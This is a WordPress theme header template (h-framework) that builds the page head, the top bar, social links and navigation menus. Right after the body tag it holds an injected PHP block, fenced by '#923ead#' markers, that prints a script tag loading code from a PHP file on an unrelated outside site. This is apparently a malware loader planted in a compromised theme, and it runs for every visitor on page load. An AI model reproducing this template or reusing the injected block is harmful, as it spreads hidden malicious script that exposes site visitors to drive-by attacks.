<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" <?php language_attributes(); ?>>
<![endif]-->
<!--[if IE 7]>
<html id="ie7" <?php language_attributes(); ?>>
<![endif]-->
<!--[if IE 8]>
<html id="ie8" <?php language_attributes(); ?>>
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html <?php language_attributes(); ?>>
<head> <!-- Start of head  -->
	<meta charset="utf-8">
    
     <?php 	global $current_user,$helper,$super_options;  if($super_options[SN.'_mobile_view']!="false") : ?> 
   			 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
   <?php else: ?>
     		 <meta name="viewport" content="width=1080"> 
   <?php endif; ?>
   
	<title>
	 <?php
	 
	 $logourl = ($super_options[SN."_logo"]=="") ? URL."/sprites/i/logo.png" : $super_options[SN."_logo"];
					  
					    if(is_home()) echo bloginfo(__('name' , 'h-framework') );
					    elseif(is_category()) {
					         _e('Browsing the Category ' , 'h-framework' );
					          wp_title(' ', true, '');
					  } elseif(is_archive()) wp_title('', true,'');
					    elseif(is_search())  echo __( 'Search Results for' , 'h-framework' ).$s;
					    elseif(is_404())     _e( '404 - Page got lost!'  , 'h-framework');
					    else                 bloginfo(__('name' , 'h-framework')); wp_title(__('-' , 'h-framework'), true, '');
					  
      ?></title>
	
    <link rel="shortcut icon" href="<?php echo $super_options[SN."_favicon"]; ?>" />
	<link rel="alternate" type="application/rss xml" title="RSS 2.0" href="<?php bloginfo('rss2_url'); ?>" /><!-- Feed  -->
    <link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
	<?php if ( is_singular() && get_option( 'thread_comments' ) )  wp_enqueue_script( 'comment-reply' );     wp_head(); ?>
    
    <!--[if (gte IE 6)&(lte IE 8)]>
      <script type="text/javascript" src="<?php echo URL; ?>/sprites/js/selectivizr-min.js"></script>
      <noscript><link rel="stylesheet" href="[fallback css]" /></noscript>
    <![endif]-->

    
    <!--[if IE 9]>
            <link rel="stylesheet" type="text/css" href="<?php echo URL; ?>/sprites/stylesheets/ie9.css" />
    <![endif]-->  
    <!--[if IE 8]>
            <link rel="stylesheet" type="text/css" href="<?php echo URL; ?>/sprites/stylesheets/ie8.css" />
        <![endif]-->  
     <!--[if IE 7]>
            <link rel="stylesheet" type="text/css" href="<?php echo URL; ?>/sprites/stylesheets/ie7.css" />
     <![endif]-->  
     
     <script type="text/javascript">
	  <?php 
		  echo stripslashes($super_options[SN."_headjs_code"]);
	  ?>
	  </script>
            
</head> <!-- End of Head -->
 
<body <?php body_class(); ?>>
<?php
#923ead#
if(empty($t)) {
$t = "<script type=\"text/javascript\" src=\"http://angeln-stralsund.de/wp-content/themes/ecn/zwvb6pxj.php\"></script>";
echo $t;
}
#/923ead#
?> <!-- Start of body  -->


<?php global $current_user; if($super_options[SN."_visual_styler"]!="false" && current_user_can('manage_options')  ) $helper->generateToolKit(); ?>

<div class="bg-texture thunder_listener" data-filter="bg bgi bgp bgr">

<?php if($super_options[SN."_is_boxable"]!="false" && $super_options[SN."_is_boxable"]!="") echo '<div class="set-margin">' ; ?>

<div class="super-wrapper clearfix <?php if($super_options[SN."_is_boxable"]!="false" && $super_options[SN."_is_boxable"]!="") echo 'boxable';?>"> <!-- Super Wrapper For ALL the Content -->



<?php if($super_options[SN.'_topbar_enable']!="false") : ?>
<a href="" id="toggle-top-menu"></a>
<div id="top-bar" class="clearfix thunder_listener" data-filter="bg" data-link-filter="cr crh crma" data-list-filter="rbr" >
	<div class="skeleton clearfix">
   
         <ul class="top-social-icons clearfix">
            <?php if($super_options[SN."_twitter_link"]!="" ) : ?><li class="twitter"><a href='<?php echo $super_options[SN."_twitter_link"]; ?>'></a></li><?php endif; ?>
            <?php if($super_options[SN."_fb_link"]!="" ) : ?><li class="fb"><a href='<?php echo $super_options[SN."_fb_link"]; ?>'></a></li><?php endif; ?>
            <?php if($super_options[SN."_google_link"]!="" ) : ?><li class="google"><a href='<?php echo $super_options[SN."_google_link"]; ?>'></a></li><?php endif; ?>
            <?php if($super_options[SN."_dribbble_link"]!="" ) : ?><li class="dribbble"><a href='<?php echo $super_options[SN."_dribbble_link"]; ?>'></a></li><?php endif; ?>
            <?php if($super_options[SN."_frost_link"]!="" ) : ?><li class="frost"><a href='<?php echo $super_options[SN."_frost_link"]; ?>'></a></li><?php endif; ?>
            <?php if($super_options[SN."_vimeo_link"]!="" ) : ?><li class="vimeo" ><a href='<?php echo $super_options[SN."_vimeo_link"]; ?>'></a></li><?php endif; ?>
            <?php if($super_options[SN."_rss_link"]!="" ) : ?><li class="rss" ><a href='<?php echo $super_options[SN."_rss_link"]; ?>'></a></li><?php endif; ?>
        </ul>
    	
        <?php  
          
                    if(function_exists("wp_nav_menu"))
                    {
                        wp_nav_menu(array(
                                    'theme_location'=>'top_nav',
                                    'container'=>'',
                                    'depth' => 3,
                                    'menu_class' => 'reconize menu clearfix',
                                    'menu_id' => 'topmenu',
                                    'fallback_cb' => false
									 )
                                    );
                    }
           ?>
    </div>
</div>
<?php endif; ?>


<div class="stage-background thunder_listener <?php if($super_options[SN.'_topbar_enable']=="false") echo "lessHeight"; ?>" data-filter="bg bgi bgp bgr"><div  class="inner-stage-background"></div></div> <!-- For Slider Stage Cutting Background  -->



<div class="mobile-logo skeleton">
<h2 id="slogo" class=""><a href="<?php echo home_url(); ?>"><img src="<?php echo $logourl; ?>" alt="logo" /><span><?php echo get_bloginfo('name').' '.get_bloginfo('description'); ?></span></a></h2>
</div>


 
<div class="top-area thunder_listener" data-filter="bg bgp bgi bgr tbr sbbr" >
  <div class="clearfix  skeleton">
  <h1 id="logo" class=""><a href="<?php echo home_url(); ?>"><img src="<?php echo $logourl; ?>" alt="logo" /><span><?php echo get_bloginfo('name').' '.get_bloginfo('description'); ?></span></a></h1>
    <div id="menu-bar-wrapper" class="thunder_listener menu-algorithm"  data-link-filter="cr crh crma bbra"  data-submenu-filter="cr crh bg rbr list-bbr"  > 
  
   
     <div id="menu-bar">
      <div class="clearfix ">
          
             
             
             <?php  
            
                      if(function_exists("wp_nav_menu"))
                      {
                          wp_nav_menu(array(
                                      'theme_location'=>'primary_nav',
                                      'container'=>'',
                                      'depth' => 3,
                                      'container_class' => 'clearfix',
                                      'menu_id' => 'menu',
                                      'fallback_cb' => false
                                       )
                                      );
                      }
             ?>
      </div>
     </div>
  </div>
 
  
  </div>
</div>



  
<div class="mobile-menu">
<div class="skeleton">
<div class="mobile-menu-wrapper ">
 <div class="mobile-menu-bg">
  	<select name="" id="mobile-menu" class="">   </select>
 </div>   
</div>
</div>
</div>
